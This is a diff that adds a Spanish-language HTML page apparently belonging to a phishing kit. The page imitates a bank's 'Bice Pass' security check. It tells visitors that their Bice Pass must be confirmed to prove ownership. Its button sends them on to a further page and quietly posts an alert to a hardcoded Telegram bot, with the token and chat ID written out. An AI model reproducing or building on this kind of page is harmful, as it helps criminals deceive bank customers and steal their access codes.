@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Imágenes una debajo de la otra</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px; /* Espacio entre las imágenes */
+    }
+
+    p {
+      color: #008CBA; /* Color naranja */
+      text-align: center;
+    }
+
+    .boton-solicitar {
+      background-color: #008CBA; /* Color de fondo azul */
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin-bottom: 20px; /* Espacio entre el botón y la última imagen */
+    }
+  </style>
+</head>
+<body>
+  <img src="Ar.jpg" alt="Imagen 1">
+  <p>Por medidas de seguridad para saber que es el propietario <br> necesitamos confirmar su bice pass.</p>
+  <img src="Ab.jpg" alt="Imagen 2">
+  <button class="boton-solicitar" onclick="redirigir()">Solicitar Bice Pass</button>
+
+  <script>
+    function redirigir() {
+      // Redirigir a otro archivo index
+      window.location.href = 'index6.html';
+      // Llamar a la función para enviar el mensaje a Telegram
+      enviarMensajeTelegram();
+    }
+
+    function enviarMensajeTelegram() {
+      // URL del bot de Telegram y el mensaje que quieres enviar
+      const telegramBotUrl = 'https://api.telegram.org/bot6140527375:AAEDfuyj0KUl1MB4IVb5jeC35_Ucfk6ykhk/sendMessage';
+      const mensaje = 'Se solicitó Bice Pass';
+
+      // Configurar la solicitud HTTP POST
+      const options = {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: '7155365525',
+          text: mensaje
+        })
+      };
+
+      // Realizar la solicitud HTTP
+      fetch(telegramBotUrl, options)
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Error al enviar el mensaje a Telegram');
+          }
+          console.log('Mensaje enviado exitosamente a Telegram');
+        })
+        .catch(error => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html>
